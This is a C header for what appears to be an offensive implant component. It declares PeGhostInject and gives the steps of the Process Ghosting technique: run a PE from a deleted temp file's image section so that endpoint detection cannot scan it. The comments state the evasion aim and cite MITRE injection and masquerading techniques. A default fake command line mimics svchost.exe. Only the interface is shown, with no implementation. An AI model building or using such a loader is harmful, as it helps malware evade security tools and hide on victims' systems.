/*
 * process_ghost.h — Process Ghosting / image-section-based PE execution
 *
 * Technique: hasherezade/Process-Ghosting (MIT)
 * https://github.com/hasherezade/process_ghosting
 *
 * Execute a PE file entirely from memory:
 *  1. Write PE to a temp file with DELETE_ON_CLOSE (tombstoned)
 *  2. NtCreateSection(SEC_IMAGE) before file is fully deleted
 *  3. Close file — it vanishes from disk, section lives on
 *  4. NtCreateProcessEx from section — ghost process referencing deleted file
 *  5. NtCreateThreadEx at PE entry point
 *
 * EDR cannot scan the file (it's deleted), cannot read image from disk.
 * Process image path points to a non-existent file.
 *
 * MITRE: T1055.012 (Process Injection: Process Hollowing / Ghosting)
 *        T1036     (Masquerading)
 */
#pragma once
#include <windows.h>
#include <stdint.h>

/*
 * PeGhostInject — execute pe_data as a ghost process.
 *
 * pe_data    : raw PE bytes (EXE or reflective DLL with EP)
 * pe_size    : byte count
 * cmdline    : fake command-line visible in task managers (wide string).
 *              NULL → defaults to  L"C:\\Windows\\System32\\svchost.exe -k netsvcs"
 * parent_pid : PID to inherit handles from (0 = current process)
 *
 * Returns: heap-allocated JSON status string, caller must free().
 *   success: {"status":"ok","pid":<n>,"msg":"ghost process started"}
 *   failure: {"status":"error","msg":"<reason>"}
 */
char *PeGhostInject(const uint8_t *pe_data, size_t pe_size,
                    const wchar_t *cmdline, DWORD parent_pid);
